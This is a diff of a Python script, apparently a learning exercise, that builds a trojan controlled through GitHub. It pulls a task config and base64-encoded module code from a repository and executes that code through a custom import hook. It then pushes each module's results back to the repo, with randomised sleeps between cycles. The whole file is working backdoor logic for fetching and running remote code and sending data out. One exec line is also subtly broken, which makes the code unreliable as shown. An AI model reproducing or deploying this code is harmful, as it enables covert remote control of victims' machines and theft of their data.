@@ -7,14 +7,14 @@ import importlib
 import random
 import threading
 import queue
-import os
-import pdb
-import dir_list
+import imp
 
 from github import Github
 
 verbose = True
 
+# Access token needs to be the first line in file
+access_token_path = 'access_token.txt'
 najort_id = 'tset_najort'
 najort_config = 'ch7/{}.json'.format(najort_id)
 data_path = 'ch7/data/{}/'.format(najort_id)
@@ -34,12 +34,10 @@ def vprint(verbose_string, lverbose=False):
         print('[{}] {}'.format(icon, verbose_string), flush=True)
 
 
-
 def connect_to_github():
     hg = None
-    with open('access_token.txt', 'r') as token_file:
-        access_token = token_file.readlines()[0]
-        vprint(len(access_token))
+    with open(access_token_path, 'r') as token_file:
+        access_token = token_file.readline()
         if len(access_token) == 40:
             hg = Github(access_token)
         else:
@@ -53,32 +51,42 @@ def connect_to_github():
 
 def get_file_contents(file_path):
     hg, repo, branch = connect_to_github()
+    file_contents = None
     try:
+        vprint('Trying to get file {}'.format(file_path))
         file_contents = repo.get_contents(file_path).content
+        vprint('Found file {}'.format(file_path))
     except Exception as eg:
-        file_contents = None
-    breakpoint()
+        vprint('File not found!')
+        raise
     return file_contents
 
+
 def get_najort_config():
-    global najort_config
+    global configured
     config_json = get_file_contents(najort_config)
     config = json.loads(base64.b64decode(config_json))
     configured = True
-    breakpoint()
+
+    vprint(config)
     for task in config:
         if task['module'] not in sys.modules:
-            exec('import {}'.format(task['module']))
-
+            try:
+                importlib.import_module(task['module'])
+            except ModuleNotFoundError as mnf:
+                raise
+            except Exception:
+                raise
     return config
 
 
 def store_module_result(data):
     hg, repo, branch = connect_to_github()
-    remote_path = 'Ch 7 - GitHub/data/{}/{}.dat'.format(
+    remote_path = 'ch7/data/{}/{}.dat'.format(
         najort_id,
         random.randint(1000, 10000))
     repo.create_file(remote_path, 'Mods Results', base64.b64encode(data))
+    vprint('Module data saved')
     return
 
 
@@ -86,37 +94,61 @@ def module_runner(module):
     task_queue.put(1)
     result = sys.modules[module].run()
     task_queue.get()
-
     store_module_result(result)
     return
 
 
 class GitImporter(object):
+
     def __init__(self):
         self.current_module_code = ''
+        self.config = dict()
 
-    def find_module(self, mod_name, path=None):
-        if configured:
-            vprint('Attempting to retrieve {}'.format(mod_name))
-            new_library = get_file_contents('modules/{}'.format(mod_name))
-
-            if not new_library:
+    def find_module(self, fullname, path=None):
+        if fullname.startswith('tig_'):
+            vprint('Attempting to retrieve {}'.format(fullname))
+            new_library = get_file_contents('ch7/modules/{}'.format(fullname))
+            vprint(new_library)
+            if new_library:
                 self.current_module_code = base64.b64decode(new_library)
                 return self
         return None
 
     def load_module(self, name):
-        module = importlib.import_module(name)
-        return module
+        if isinstance(name, str) and name in sys.modules:
+            return sys.modules[name]
+        elif isinstance(name, str):
+            try:
+                # module = importlib.import_module(name)
+                module = imp.new_module(name)
+                exec(self.current_module_code in module.__dict__)
+                sys.modules[name] = module
 
-sys.meta_path = [GitImporter()]
+                return module
+            except Exception as elm:
+                vprint('Unable to load module. {}'.format(elm))
+                raise
+        else:
+            raise ValueError('Module {} not loaded.'.format(name))
 
-while True:
-    if task_queue.empty():
-        config = get_najort_config()
-        for task in config:
-            t = threading.Thread(target=module_runner, args=(task['module'],))
-            t.start()
-            time.sleep(random.randint(1,10))
 
-    time.sleep(random.randint(1000, 10000))
+def main():
+    sys.meta_path.append(GitImporter())
+
+    while True:
+        if task_queue.empty():
+            config = get_najort_config()
+            vprint(config)
+
+            if config and configured:
+                for task in config:
+                    t = threading.Thread(
+                        target=module_runner,
+                        args=(task['module'],))
+                    t.start()
+                    time.sleep(random.randint(1, 10))
+        time.sleep(random.randint(100, 1000))
+
+
+if __name__ == '__main__':
+    main()
